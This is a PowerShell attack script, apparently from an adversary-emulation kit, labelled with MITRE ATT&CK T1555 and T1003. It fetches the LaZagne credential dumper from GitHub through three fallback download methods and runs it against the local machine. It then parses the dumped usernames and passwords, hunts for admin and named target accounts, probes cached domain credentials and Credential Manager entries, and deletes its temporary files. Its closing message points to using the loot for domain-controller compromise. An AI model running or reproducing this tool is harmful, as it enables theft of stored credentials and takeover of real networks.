# === Credential Extraction (T1555 + T1003) ===
# Extracts stored credentials and in-memory secrets using LaZagne
# Maps to MITRE ATT&CK T1555 - Credentials from Password Stores & T1003 - OS Credential Dumping

param(
    [string]$OutputDirectory = "C:\Intel\Logs",
    [switch]$AllCredentials = $true,
    [switch]$DomainFocus = $true,
    [string]$TargetUser = ""
)

$results = @()
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
$lazagneUrl = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe"
$tempDir = $env:TEMP
$lazagnePath = Join-Path $tempDir "lazagne.exe"

Write-Host "[*] Starting Credential Extraction (T1555 + T1003)..." -ForegroundColor Cyan

try {
    # Ensure we have admin privileges for credential extraction
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Administrative privileges recommended for complete credential extraction" -ForegroundColor Yellow
        Write-Host "[!] Some credential sources may not be accessible" -ForegroundColor Yellow
    } else {
        Write-Host "[+] Running with administrative privileges" -ForegroundColor Green
    }
    
    # Download LaZagne if not present
    Write-Host "[*] Checking for LaZagne..." -ForegroundColor Yellow
    
    if (-not (Test-Path $lazagnePath)) {
        Write-Host "[*] Downloading LaZagne from GitHub..." -ForegroundColor Cyan
        try {
            # Use multiple download methods
            $downloaded = $false
            
            # Method 1: Invoke-WebRequest
            try {
                Invoke-WebRequest -Uri $lazagneUrl -OutFile $lazagnePath -UseBasicParsing -ErrorAction Stop
                $downloaded = $true
                Write-Host "[+] LaZagne downloaded successfully via Invoke-WebRequest" -ForegroundColor Green
            }
            catch {
                Write-Host "[!] Invoke-WebRequest failed, trying alternative method..." -ForegroundColor Yellow
            }
            
            # Method 2: WebClient if Invoke-WebRequest fails
            if (-not $downloaded) {
                try {
                    $webClient = New-Object System.Net.WebClient
                    $webClient.DownloadFile($lazagneUrl, $lazagnePath)
                    $webClient.Dispose()
                    $downloaded = $true
                    Write-Host "[+] LaZagne downloaded successfully via WebClient" -ForegroundColor Green
                }
                catch {
                    Write-Host "[!] WebClient download also failed" -ForegroundColor Red
                }
            }
            
            # Method 3: Manual curl if available
            if (-not $downloaded) {
                try {
                    $curlResult = & curl.exe -L -o $lazagnePath $lazagneUrl 2>$null
                    if (Test-Path $lazagnePath) {
                        $downloaded = $true
                        Write-Host "[+] LaZagne downloaded successfully via curl" -ForegroundColor Green
                    }
                }
                catch {
                    Write-Host "[!] Curl download failed" -ForegroundColor Yellow
                }
            }
            
            if (-not $downloaded) {
                throw "Failed to download LaZagne using all methods"
            }
        }
        catch {
            Write-Host "[!] Could not download LaZagne: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "[!] Manual download required from: $lazagneUrl" -ForegroundColor Yellow
            throw "LaZagne download failed"
        }
    } else {
        Write-Host "[+] LaZagne already available" -ForegroundColor Green
    }
    
    # Verify LaZagne executable
    if (-not (Test-Path $lazagnePath)) {
        throw "LaZagne executable not found at: $lazagnePath"
    }
    
    $lazagneSize = (Get-Item $lazagnePath).Length
    Write-Host "[+] LaZagne ready (Size: $([math]::Round($lazagneSize / 1MB, 2)) MB)" -ForegroundColor Green
    
    # Prepare output directory
    if (-not (Test-Path $OutputDirectory)) {
        New-Item -ItemType Directory -Path $OutputDirectory -Force | Out-Null
    }
    
    $credOutputFile = Join-Path $OutputDirectory "CredExtraction_LaZagne_Raw.txt"
    $processedOutputFile = Join-Path $OutputDirectory "CredExtraction_ProcessedCreds.txt"
    
    # Execute LaZagne with comprehensive options
    Write-Host "[*] Executing LaZagne credential extraction..." -ForegroundColor Cyan
    Write-Host "[*] This may take several minutes depending on system state..." -ForegroundColor Yellow
    
    # LaZagne doesn't support output file options, just run with basic args
    $lazagneArgs = @("all")
    
    Write-Host "[*] Running: lazagne.exe $($lazagneArgs -join ' ')" -ForegroundColor Gray
    
    try {
        # Execute LaZagne and capture both stdout and stderr
        $lazagneProcess = Start-Process -FilePath $lazagnePath -ArgumentList $lazagneArgs -WorkingDirectory $tempDir -NoNewWindow -PassThru -Wait -RedirectStandardOutput "$tempDir\lazagne_stdout.txt" -RedirectStandardError "$tempDir\lazagne_stderr.txt"
        $exitCode = $lazagneProcess.ExitCode
        
        # Read output files
        $stdOutput = ""
        $stdError = ""
        
        if (Test-Path "$tempDir\lazagne_stdout.txt") {
            $stdOutput = Get-Content "$tempDir\lazagne_stdout.txt" -Raw -ErrorAction SilentlyContinue
        }
        
        if (Test-Path "$tempDir\lazagne_stderr.txt") {
            $stdError = Get-Content "$tempDir\lazagne_stderr.txt" -Raw -ErrorAction SilentlyContinue
        }
        
        Write-Host "[+] LaZagne execution completed (Exit Code: $exitCode)" -ForegroundColor Green
        
        if ($stdOutput) {
            Write-Host "[+] Standard Output captured" -ForegroundColor Green
            # Save raw LaZagne output to Intel\Logs directory
            $stdOutput | Out-File -FilePath $credOutputFile -Encoding UTF8
        }
        if ($stdError -and $stdError.Trim() -ne "") {
            Write-Host "[!] Standard Error: $stdError" -ForegroundColor Yellow
        }
        
    }
    catch {
        Write-Host "[!] LaZagne execution failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Process and analyze results
    Write-Host "[*] Processing credential extraction results..." -ForegroundColor Cyan
    
    $credentialResults = @()
    $domainAdminFound = $false
    
    # Parse LaZagne output file if it exists
    if (Test-Path $credOutputFile) {
        $rawOutput = Get-Content $credOutputFile -Raw -ErrorAction SilentlyContinue
        Write-Host "[+] LaZagne output file found and loaded" -ForegroundColor Green
        
        # Save raw output to results
        $credentialResults += [PSCustomObject]@{
            Source = "LaZagne Raw Output"
            Type = "Complete Dump"
            Username = "N/A"
            Password = "N/A"
            Domain = "N/A"
            Details = $rawOutput
            Timestamp = $timestamp
            Notes = "Full LaZagne credential extraction results"
        }
    }
    
    # Also check stdout for credentials
    if ($stdOutput -and $stdOutput.Trim() -ne "") {
        Write-Host "[+] Processing standard output for credentials..." -ForegroundColor Green
        
        # Look for credential patterns in stdout
        $lines = $stdOutput -split "`n"
        $currentSection = ""
        
        foreach ($line in $lines) {
            $line = $line.Trim()
            if ($line -eq "") { continue }
            
            # Identify credential sections
            if ($line -match "^\[.*\]$") {
                $currentSection = $line.Trim("[]")
                continue
            }
            
            # Look for username/password patterns
            if ($line -match "Username:\s*(.+)") {
                $username = $matches[1].Trim()
                if ($TargetUser -and $username -like "*$TargetUser*") {
                    Write-Host "[!] TARGET USER FOUND: $username" -ForegroundColor Red
                }
                if ($username -match ".*admin.*|.*adm.*" -or $currentSection -match "domain") {
                    $domainAdminFound = $true
                    Write-Host "[!] POTENTIAL ADMIN CREDENTIAL: $username" -ForegroundColor Red
                }
            }
            
            if ($line -match "Password:\s*(.+)") {
                $password = $matches[1].Trim()
                Write-Host "[+] Password extracted for current user" -ForegroundColor Green
            }
        }
        
        # Save stdout analysis
        $credentialResults += [PSCustomObject]@{
            Source = "LaZagne Standard Output"
            Type = "Parsed Output"
            Username = "Various"
            Password = "Various"
            Domain = "Various"
            Details = $stdOutput
            Timestamp = $timestamp
            Notes = "Processed LaZagne standard output"
        }
    }
    
    # Additional Windows credential extraction attempts
    Write-Host "[*] Attempting additional Windows credential extraction..." -ForegroundColor Cyan
    
    # Check for cached domain credentials
    try {
        $cachedCreds = Get-ChildItem "HKLM:\SECURITY\Cache" -ErrorAction SilentlyContinue
        if ($cachedCreds) {
            Write-Host "[+] Cached domain credentials registry key found" -ForegroundColor Green
            $credentialResults += [PSCustomObject]@{
                Source = "Registry Cache"
                Type = "Cached Domain Credentials"
                Username = "Domain Users"
                Password = "Hashed"
                Domain = "Domain"
                Details = "Registry key: HKLM:\SECURITY\Cache"
                Timestamp = $timestamp
                Notes = "Cached domain credentials detected (requires advanced extraction)"
            }
        }
    }
    catch {
        Write-Host "[!] Could not access cached credentials registry" -ForegroundColor Yellow
    }
    
    # Check currently logged in users
    Write-Host "[*] Identifying currently logged in users..." -ForegroundColor Yellow
    try {
        $loggedInUsers = quser 2>$null | Select-Object -Skip 1 | ForEach-Object {
            if ($_ -match "^\s*(\S+)\s+(\S+)?\s+(\d+)\s+(\S+)\s+(.+)$") {
                $user = $matches[1].Trim()
                $session = $matches[3].Trim()
                
                $credentialResults += [PSCustomObject]@{
                    Source = "Active Sessions"
                    Type = "Logged In User"
                    Username = $user
                    Password = "N/A"
                    Domain = $env:USERDOMAIN
                    Details = "Session ID: $session, Status: Active"
                    Timestamp = $timestamp
                    Notes = "User currently logged into system - potential credential extraction target"
                }
                
                if ($user -like "*$TargetUser*") {
                    Write-Host "[!] TARGET USER SHERLOCK ACTIVE: $user (Session: $session)" -ForegroundColor Red
                    $domainAdminFound = $true
                }
                
                return $user
            }
        }
        
        Write-Host "[+] Found $($loggedInUsers.Count) active user sessions" -ForegroundColor Green
        $loggedInUsers | ForEach-Object { Write-Host "    - $_" -ForegroundColor Gray }
        
    }
    catch {
        Write-Host "[!] Could not enumerate active user sessions" -ForegroundColor Yellow
    }
    
    # Save processed results
    $processedOutput = $credentialResults | Format-Table -AutoSize | Out-String
    $processedOutput | Out-File -FilePath $processedOutputFile -Encoding UTF8
    
    # Generate summary
    Write-Host ""
    Write-Host "Credential Extraction Summary:" -ForegroundColor Cyan
    Write-Host "- Extraction Method: LaZagne + Windows APIs" -ForegroundColor White
    Write-Host "- Total Credential Sources: $($credentialResults.Count)" -ForegroundColor White
    Write-Host "- Admin Privileges: $isAdmin" -ForegroundColor White
    Write-Host "- Domain Admin Found: $domainAdminFound" -ForegroundColor White
    Write-Host "- Target User ($TargetUser): $(if ($TargetUser) { 'Searched' } else { 'Not Specified' })" -ForegroundColor White
    Write-Host "- Raw Output: $credOutputFile" -ForegroundColor White
    Write-Host "- Processed Output: $processedOutputFile" -ForegroundColor White
    Write-Host "- Timestamp: $timestamp" -ForegroundColor White
    
    if ($domainAdminFound) {
        Write-Host ""
        Write-Host "[!] POTENTIAL DOMAIN ADMIN CREDENTIALS FOUND!" -ForegroundColor Red
        Write-Host "[!] Review output files for credential details" -ForegroundColor Red
        Write-Host "[!] Next Step: Use credentials for DC compromise" -ForegroundColor Red
    }
    
    return $credentialResults
    
} catch {
    Write-Host "[!] Credential extraction failed: $($_.Exception.Message)" -ForegroundColor Red
    
    # Fallback: Basic Windows credential enumeration
    Write-Host "[*] Attempting fallback credential enumeration..." -ForegroundColor Yellow
    
    try {
        # Check Windows Credential Manager
        $credManager = cmdkey /list 2>$null
        if ($credManager) {
            $results += [PSCustomObject]@{
                Source = "Windows Credential Manager"
                Type = "Stored Credentials"
                Username = "Various"
                Password = "Stored"
                Domain = "Various"
                Details = $credManager -join "`n"
                Timestamp = $timestamp
                Notes = "Windows Credential Manager entries (cmdkey /list)"
            }
            Write-Host "[+] Windows Credential Manager entries found" -ForegroundColor Green
        }
        
        return $results
    }
    catch {
        Write-Host "[!] All credential extraction methods failed" -ForegroundColor Red
        return @()
    }
} finally {
    # Cleanup temporary files
    try {
        if (Test-Path "$tempDir\lazagne_stdout.txt") { Remove-Item "$tempDir\lazagne_stdout.txt" -Force -ErrorAction SilentlyContinue }
        if (Test-Path "$tempDir\lazagne_stderr.txt") { Remove-Item "$tempDir\lazagne_stderr.txt" -Force -ErrorAction SilentlyContinue }
    }
    catch {
        # Ignore cleanup errors
    }
}